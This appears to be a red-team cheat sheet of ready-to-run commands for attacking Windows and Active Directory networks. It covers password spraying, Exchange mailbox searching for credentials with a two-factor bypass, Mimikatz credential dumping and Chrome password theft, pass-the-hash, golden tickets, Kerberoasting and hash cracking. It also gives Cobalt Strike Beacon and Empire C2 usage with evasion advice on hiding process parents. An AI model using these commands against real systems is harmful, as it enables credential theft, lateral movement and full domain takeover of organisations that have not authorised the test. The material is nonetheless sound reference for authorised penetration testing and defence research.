<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>[USER32] |get-member -static
</pre></div>
</td></tr></table>

<h3 id="mailsniper-owa-and-exchange-enumeration">MailSniper (OWA and Exchange Enumeration)<a class="headerlink" href="#mailsniper-owa-and-exchange-enumeration" title="Permanent link">&para;</a></h3>
<p>Source: <a href="https://github.com/dafthack/MailSniper">https://github.com/dafthack/MailSniper</a></p>
<p>MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain.</p>
<p>MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS.</p>
<p>Bypassing Dual Factor Authentication on OWA – <a href="http://www.blackhillsinfosec.com/?p=5396">http://www.blackhillsinfosec.com/?p=5396</a></p>
<ul>
<li>It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange.</li>
<li>Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.comEWSExchange.asmx</li>
</ul>
<p><code class="codehilite">Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote</code></p>
<ul>
<li>After the credentials have been entered MailSniper will attempt to connect to the EWS URL at <a href="https://mail.domain.com/EWS/Exchange.asmx">https://mail.domain.com/EWS/Exchange.asmx</a> and search the user's inbox for key terms (by default "<em>pass</em>", "<em>creds</em>", and "<em>credentials</em>").</li>
</ul>
<h4 id="locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name">Locate OWA instances via Autodiscover using only organization primary domain name<a class="headerlink" href="#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>    <span class="o">/</span><span class="nt">Autodiscover</span><span class="o">/</span><span class="nt">Autodiscover</span><span class="p">.</span><span class="nc">xml</span>

    <span class="nt">or</span>

    <span class="nt">autodiscover</span><span class="o">./</span><span class="nt">Autodiscover</span><span class="o">/</span><span class="nt">Autodiscover</span><span class="p">.</span><span class="nc">xml</span>

    <span class="nt">or</span>

    <span class="nt">dig</span> <span class="nt">_autodiscover</span><span class="p">.</span><span class="nc">_tcp</span><span class="o">.</span> <span class="nt">SRV</span>
    <span class="o">;</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="nt">DiG</span> <span class="nt">9</span><span class="p">.</span><span class="nc">8</span><span class="p">.</span><span class="nc">3-P1</span> <span class="o">&lt;&lt;&gt;&gt;</span> <span class="nt">_autodiscover</span><span class="p">.</span><span class="nc">_tcp</span><span class="o">.</span><span class="p">.</span><span class="nc">org</span> <span class="nt">SRV</span>
    <span class="o">;;</span> <span class="nt">global</span> <span class="nt">options</span><span class="o">:</span> <span class="o">+</span><span class="nt">cmd</span>
    <span class="o">;;</span> <span class="nt">Got</span> <span class="nt">answer</span><span class="o">:</span>
    <span class="o">;;</span> <span class="nt">-</span><span class="o">&gt;&gt;</span><span class="nt">HEADER</span><span class="o">&lt;&lt;</span><span class="nt">-</span> <span class="nt">opcode</span><span class="o">:</span> <span class="nt">QUERY</span><span class="o">,</span> <span class="nt">status</span><span class="o">:</span> <span class="nt">NOERROR</span><span class="o">,</span> <span class="nt">id</span><span class="o">:</span> <span class="nt">45003</span>
    <span class="o">;;</span> <span class="nt">flags</span><span class="o">:</span> <span class="nt">qr</span> <span class="nt">rd</span> <span class="nt">ra</span><span class="o">;</span> <span class="nt">QUERY</span><span class="o">:</span> <span class="nt">1</span><span class="o">,</span> <span class="nt">ANSWER</span><span class="o">:</span> <span class="nt">1</span><span class="o">,</span> <span class="nt">AUTHORITY</span><span class="o">:</span> <span class="nt">0</span><span class="o">,</span> <span class="nt">ADDITIONAL</span><span class="o">:</span> <span class="nt">0</span>

    <span class="o">;;</span> <span class="nt">QUESTION</span> <span class="nt">SECTION</span><span class="o">:</span>
    <span class="o">;</span><span class="nt">_autodiscover</span><span class="p">.</span><span class="nc">_tcp</span><span class="o">.</span><span class="p">.</span><span class="nc">org</span><span class="o">.</span> <span class="nt">IN</span> <span class="nt">SRV</span>

    <span class="o">;;</span> <span class="nt">ANSWER</span> <span class="nt">SECTION</span><span class="o">:</span>
    <span class="nt">_autodiscover</span><span class="p">.</span><span class="nc">_tcp</span><span class="o">.</span><span class="p">.</span><span class="nc">org</span><span class="o">.</span> <span class="nt">1720</span> <span class="nt">IN</span> <span class="nt">SRV</span> <span class="nt">0</span> <span class="nt">0</span> <span class="nt">443</span> <span class="nt">webmail</span><span class="o">.</span><span class="p">.</span><span class="nc">org</span><span class="o">.</span>

    <span class="o">;;</span> <span class="nt">Query</span> <span class="nt">time</span><span class="o">:</span> <span class="nt">2</span> <span class="nt">msec</span>
    <span class="o">;;</span> <span class="nt">SERVER</span><span class="o">:</span> <span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">178</span><span class="p">.</span><span class="nc">1</span><span class="p">#</span><span class="nn">53</span><span class="o">(</span><span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">178</span><span class="p">.</span><span class="nc">1</span><span class="o">)</span>
    <span class="o">;;</span> <span class="nt">WHEN</span><span class="o">:</span> <span class="nt">Thu</span> <span class="nt">Dec</span> <span class="nt">1</span> <span class="nt">10</span><span class="p">:</span><span class="nd">40</span><span class="p">:</span><span class="nd">33</span> <span class="nt">2016</span>
    <span class="o">;;</span> <span class="nt">MSG</span> <span class="nt">SIZE</span> <span class="nt">rcvd</span><span class="o">:</span> <span class="nt">83</span>
</pre></div>
</td></tr></table>

<h3 id="domainpasswordspray-internal-windows-domain-password-brute-forcing">DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)<a class="headerlink" href="#domainpasswordspray-internal-windows-domain-password-brute-forcing" title="Permanent link">&para;</a></h3>
<p>Source: <a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
<p>DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!</p>
<h4 id="quick-start-guide">Quick Start Guide<a class="headerlink" href="#quick-start-guide" title="Permanent link">&para;</a></h4>
<p>Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Type &#39;Import-Module Invoke-DomainPasswordSpray.ps1&#39;.
</pre></div>
</td></tr></table>

<p>The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts.</p>
<p>The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>PowerShell Invoke-DomainPasswordSpray -Password Winter2016
</pre></div>
</td></tr></table>

<p>The following command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
</pre></div>
</td></tr></table>

<h4 id="invoke-domainpasswordspray-options">Invoke-DomainPasswordSpray Options<a class="headerlink" href="#invoke-domainpasswordspray-options" title="Permanent link">&para;</a></h4>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>UserList - Optional UserList parameter. This will be generated automatically if not specified.
Password - A single password that will be used to perform the password spray.
PasswordList - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).
OutFile - A file to output the results to.
Domain - A domain to spray against.
</pre></div>
</td></tr></table>

<h3 id="misc-powershell-pasties">Misc Powershell Pasties<a class="headerlink" href="#misc-powershell-pasties" title="Permanent link">&para;</a></h3>
<p>List Removeable Drives</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne &#39;A:&#39;)} | %{&quot;USB_PROCESS_DETECTED: &quot; + $_.ProviderName + &quot;`n&quot;}
</pre></div>
</td></tr></table>

<p>Random Execution Method</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>$visio = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;visio.application&quot;, &quot;system1&quot;))
$docs = $visio.Documents.Add(&quot;&quot;)
$docs.ExecuteLine(&#39;CreateObject(&quot;Wscript.Shell&quot;).Exec(&quot;cmd.exe&quot;)&#39;)
</pre></div>
</td></tr></table>

<h2 id="mimikatz">Mimikatz<a class="headerlink" href="#mimikatz" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/gentilkiwi/mimikatz/wiki">https://github.com/gentilkiwi/mimikatz/wiki</a></p>
<blockquote>
<p><a href="https://adsecurity.org/?p=2362">Attack Methods for Gaining Domain Admin Rights in Active Directory</a></p>
</blockquote>
<p>Dump Cleartext Credentials</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>sekurlsa::wdigest
sekurlsa::logonpasswords
lsadump::secrets
</pre></div>
</td></tr></table>

<p>Dump cached domain credentials</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>lsadump::cache
</pre></div>
</td></tr></table>

<p>Format mscachev2 as <code class="codehilite">$DCC2$10240#username#hash</code></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>cat &#39;mscachecreds.txt&#39; | awk -F &quot;:&quot; {&#39;print &quot;$DCC2$10240#&quot;$1&quot;#&quot;$2&#39;}
</pre></div>
</td></tr></table>

<p>Crack mscachev2 format with Hashcat (extremely slow)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule
</pre></div>
</td></tr></table>

<p>DCSYNC – Remote Hash Dumping from a Domain Controller</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>mimikatz lsadump::dcsync /user:domainkrbtgt
</pre></div>
</td></tr></table>

<ul>
<li>There is also a CS built-in function for this</li>
<li>Source: <a href="http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/">http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/</a></li>
</ul>
<p>Pass the Hash</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden
</pre></div>
</td></tr></table>

<p>Golden Ticket Creation (File)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt: /ticket:newadmin.tkt
</pre></div>
</td></tr></table>

<p>Golden Ticket Creation (Pass-The-Ticket) – Create the ticket for your current session</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt: /ptt
</pre></div>
</td></tr></table>

<p>To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>/user:ChildDomainControllerMachineName$
/rc4: KRBTGT Hash
/sid:Child Domain SID
/domain:FQDN of Child Domain
/groups:516
/sids:ParentSID-516,S-1-5-9
/id:ID of Child Domain Controller
/ptt
</pre></div>
</td></tr></table>

<p>Dump Google Chrome passwords</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>shell copy &quot;C:userskobrienappdatalocalgooglechromeuser datadefaultLogin Data&quot; C:userspubliclibrariesld.dat

steal_token

mimikatz @dpapi::chrome /in:C:userspubliclibrariesld.dat /unprotect
</pre></div>
</td></tr></table>

<p>Detecting Golden Ticket use on a DC</p>
<h2 id="kerberoast">Kerberoast<a class="headerlink" href="#kerberoast" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a><br />
<a href="https://room362.com/post/2016/kerberoast-pt1/">https://room362.com/post/2016/kerberoast-pt1/</a><br />
<a href="https://room362.com/post/2016/kerberoast-pt2/">https://room362.com/post/2016/kerberoast-pt2/</a><br />
<a href="https://room362.com/post/2016/kerberoast-pt3/">https://room362.com/post/2016/kerberoast-pt3/</a></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/host.domain.com&quot;
</pre></div>
</td></tr></table>

<p>Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>mimkatz kerberos::list /export
Invoke-Mimikatz -Command &#39;standard::base64 &quot;kerberos::list /export&quot; exit&#39;
</pre></div>
</td></tr></table>

<p>Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred)</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip -outputfile
</pre></div>
</td></tr></table>

<p>Cracking the hashes</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule

./john --format=krb5tgs spns.dump --wordlist=
</pre></div>
</td></tr></table>

<h2 id="domain-admin-privesc-methods">Domain Admin Privesc Methods<a class="headerlink" href="#domain-admin-privesc-methods" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://adsecurity.org/?p=2362">Attack Methods for Gaining Domain Admin Rights in Active Directory</a></p>
</blockquote>
<ol>
<li>Passwords in SYSVOL &amp; Group Policy Preferences</li>
</ol>
<p><code class="codehilite">findstr /S cpassword %logonserver%sysvol*.xml</code><br />
or use Get-GPPPasswords.ps1 from PowerSploit</p>
<ol>
<li>Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch</li>
<li>Kerberos TGS Service Ticket Offline Cracking (Kerberoast)</li>
<li>The Credential Theft Shuffle</li>
<li>
<p>Gain access to AD Database file (ntds.dit)</p>
</li>
<li>
<p>Backup locations (backup server storage, media, and/or network shares)  </p>
</li>
<li>Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers.  </li>
<li>With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline.</li>
</ol>
<p>Simple TCP Port Redirection</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>socat TCP-LISTEN:80,fork TCP::80
socat TCP-LISTEN:443,fork TCP::443
</pre></div>
</td></tr></table>

<p>UDP Port Redirection</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nt">socat</span> <span class="nt">udp4-recvfrom</span><span class="p">:</span><span class="nd">53</span><span class="o">,</span><span class="nt">reuseaddr</span><span class="o">,</span><span class="nt">fork</span> <span class="nt">udp4-sendto</span><span class="o">:;</span> <span class="nt">echo</span> <span class="nt">-ne</span>
</pre></div>
</td></tr></table>

<p>Simple HTTP Redirect</p>
<p>Save as a file like the following as redirect.html and map to root "/" on your Team Server. Casual browsing to the root of your domain will then simply redirect.</p>
<h2 id="domain-fronting">Domain Fronting<a class="headerlink" href="#domain-fronting" title="Permanent link">&para;</a></h2>
<ul>
<li><a href="https://github.com/rvrsh3ll/FindFrontableDomains">https://github.com/rvrsh3ll/FindFrontableDomains</a></li>
</ul>
<h2 id="cobalt-strike">Cobalt Strike<a class="headerlink" href="#cobalt-strike" title="Permanent link">&para;</a></h2>
<p><a href="http://blog.cobaltstrike.com/2016/07/06/gettin-down-with-aggressor-script/">Gettin' Down with Aggressor Script</a><br />
<a href="https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna">https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna</a><br />
<a href="https://github.com/Und3rf10w/Aggressor-scripts">https://github.com/Und3rf10w/Aggressor-scripts</a></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>portscan 10.42.175.0/26 21,22,23,25,80,443,445,1433,3389,8080,8443
</pre></div>
</td></tr></table>

<p><em>Start Remote Beacon DLL via iwmi</em></p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>powerpick iwmi -class Win32_Process -name create -ArgumentList &quot;rundll32.exe c:userspubliclibrariessmb_beacon.dll.log0,StartW&quot;
</pre></div>
</td></tr></table>

<h3 id="opsec-considerations-for-beacon-commands">OPSEC Considerations for Beacon Commands<a class="headerlink" href="#opsec-considerations-for-beacon-commands" title="Permanent link">&para;</a></h3>
<p><a href="https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/#respond">Blog.Cobaltstrike.com – OPSEC Considerations For Beacon Commands</a></p>
<p>A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe.</p>
<p><em>API-only</em><br />
These commands are built-into Beacon and rely on Win32 APIs to meet their objectives.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>cd
cp
download
drives
exit
getuid
kerberos_ccache_use
kerberos_ticket_purge
kerberos_ticket_use
jobkill
kill
link
ls
make_token
mkdir
mv
ppid
ps
pwd
rev2self
rm
rportfwd
socks
steal_token
timestomp
unlink
upload
</pre></div>
</td></tr></table>

<p><em>House-keeping Commands</em><br />
The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>cancel
checkin
clear
downloads
help
jobs
mode dns
mode dns-txt
mode dns6
mode http
note
powershell-import
sleep
socks stop
spawnto
</pre></div>
</td></tr></table>

<p><em>Post-Exploitation Jobs (Process Execution + Remote Process Injection)</em><br />
Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>browserpivot
bypassuac
covertvpn
dcsync
desktop
elevate
hashdump
keylogger
logonpasswords
mimikatz
net
portscan
powerpick
psinject
pth
screenshot
shspawn
spawn
ssh
ssh-key
wdigest
</pre></div>
</td></tr></table>

<p>OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don't want that). The ppid command will change the parent process these jobs are run under as well.</p>
<p><em>Process Execution</em><br />
These commands spawn a new process:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>execute
runas
runu
</pre></div>
</td></tr></table>

<p>OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu.</p>
<p><em>Process Execution: Cmd.exe</em><br />
The shell command depends on cmd.exe.</p>
<p>The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe.</p>
<p>OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script's &amp;bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand.</p>
<p><em>Process Execution: PowerShell.exe</em><br />
The following commands launch powershell.exe to perform some task on your behalf.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>powershell
spawnas
spawnu
winrm
wmi
</pre></div>
</td></tr></table>

<p>OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>spawnu has runu which runs an arbitrary command under another process.
spawnas has runas which runs an arbitrary command as another user.
powershell has powerpick, this command runs powershell scripts without powershell.exe.
</pre></div>
</td></tr></table>

<p>It's also possible to laterally spread without the winrm and wmi commands.<br />
Remote Process Injection</p>
<p>The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are:</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>dllinject
inject
shinject
</pre></div>
</td></tr></table>

<p><em>Service Creation</em></p>
<p>The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services.</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>getsystem
psexec
psexec_psh
</pre></div>
</td></tr></table>

<h3 id="powershell-function-wrapper">Powershell Function Wrapper<a class="headerlink" href="#powershell-function-wrapper" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna">https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna</a><br />
<a href="https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/">https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/</a></p>
<h3 id="persistence-scripts">Persistence Scripts<a class="headerlink" href="#persistence-scripts" title="Permanent link">&para;</a></h3>
<p><a href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script</a><br />
<a href="https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna">https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna</a></p>
<h2 id="empire">EMPIRE<a class="headerlink" href="#empire" title="Permanent link">&para;</a></h2>
<p>Cheat sheets</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>- https://github.com/adaptivethreat/Empire/wiki/Quickstart
- https://attackerkb.com/Powershell/Powershell_Empire
</pre></div>
</td></tr></table>

<p>Clone GIT Repo</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@workstation:~# git clone https://github.com/adaptivethreat/Empire.git empire
Cloning into &#39;empire&#39;...
</pre></div>
</td></tr></table>

<p>Install Empire</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@workstation:~# cd empire/
root@workstation:~/empire# cd setup/
root@workstation:~/empire/setup# ./install.sh
Reading package lists... Done
Building dependency tree
Reading state information... Done
...

Successfully installed pydispatcher
Cleaning up...

[&amp;gt;] Enter server negotiation password, enter for random generation:

[*] Database setup completed!

root@workstation:~/empire/setup#
</pre></div>
</td></tr></table>

<p>Start Empire</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>root@workstation:~/empire/setup# cd ..
root@workstation:~/empire# ./empire
</pre></div>
</td></tr></table>

<p>Start with REST API for use with Empire Web</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>./empire --headless --username admin --password --restport 1337

./empire --rest --username admin --password --restport 1337
</pre></div>
</td></tr></table>

<h3 id="c2-profiles">C2 Profiles<a class="headerlink" href="#c2-profiles" title="Permanent link">&para;</a></h3>
<p>Edit default client settings in <code class="codehilite">/setup/setup_database.py</code></p>
<p>Example Default Profile</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="codehilite"><pre><span></span>&quot;/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en&quot;
</pre></div>
</td></tr></table>

<h2 id="bash">BASH<a class="headerlink" href="#bash" title="Permanent link">&para;</a></h2>
<p>BASH loop example</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="nt">for</span> <span class="nt">u</span> <span class="nt">in</span> <span class="err">`</span><span class="nt">cat</span> <span class="nt">hosts</span><span class="p">.</span><span class="nc">txt</span><span class="err">`</span><span class="o">;</span> <span class="nt">do</span>
<span class="nt">echo</span> <span class="nt">-n</span> <span class="s2">&quot;</span><span class="cp">[</span><span class="o">*</span><span class="cp">]</span><span class="s2"> user: $u&quot;</span> <span class="o">&amp;</span><span class="nt">amp</span><span class="o">;&amp;</span><span class="nt">amp</span><span class="o">;</span> 
<span class="nt">proxychains</span> <span class="nt">python</span> <span class="o">/</span><span class="nt">usr</span><span class="o">/</span><span class="nt">local</span><span class="o">/</span><span class="nt">bin</span><span class="o">/</span><span class="nt">secretsdump</span><span class="p">.</span><span class="nc">py</span> <span class="nt">domain</span><span class="o">/</span><span class="nt">username</span><span class="o">@$</span><span class="nt">u</span> <span class="nt">-hashes</span> <span class="nt">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="nd">0e493911f561a425e7a905329f4454bf</span> <span class="o">|</span><span class="nt">tee</span> <span class="nt">user_brute</span><span class="p">.</span><span class="nc">log</span>
<span class="nt">done</span>
</pre></div>
</td></tr></table>

<p>BASH .bashrc Function Example</p>
<table class="codehilitetable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="codehilite"><pre><span></span><span class="kd">function</span> <span class="nx">start_sshtunnel() {</span>
<span class="nx">ssh</span> <span class="o">-</span><span class="nx">A</span> <span class="o">-</span><span class="nx">t</span> <span class="o">-</span><span class="nx">p22</span> <span class="o">-</span><span class="nx">L</span> <span class="nx">8800</span>:<span class="kt">localhost</span><span class="o">:</span><span class="mi">8800</span> <span class="nx">james</span><span class="kd">@123</span><span class="p">.</span><span class="mf">001.123</span> <span class="o">-</span><span class="nx">t</span> <span class="nx">ssh</span> <span class="o">-</span><span class="nx">L</span> <span class="nx">8800</span>:<span class="kt">localhost</span><span class="o">:</span><span class="mi">80</span> <span class="nx">james</span><span class="kd">@124</span><span class="p">.</span><span class="mf">125.123</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>

<p>Quick BASH format .bash_profile (mod ipconfig &gt; ifconfig for Linux)</p>
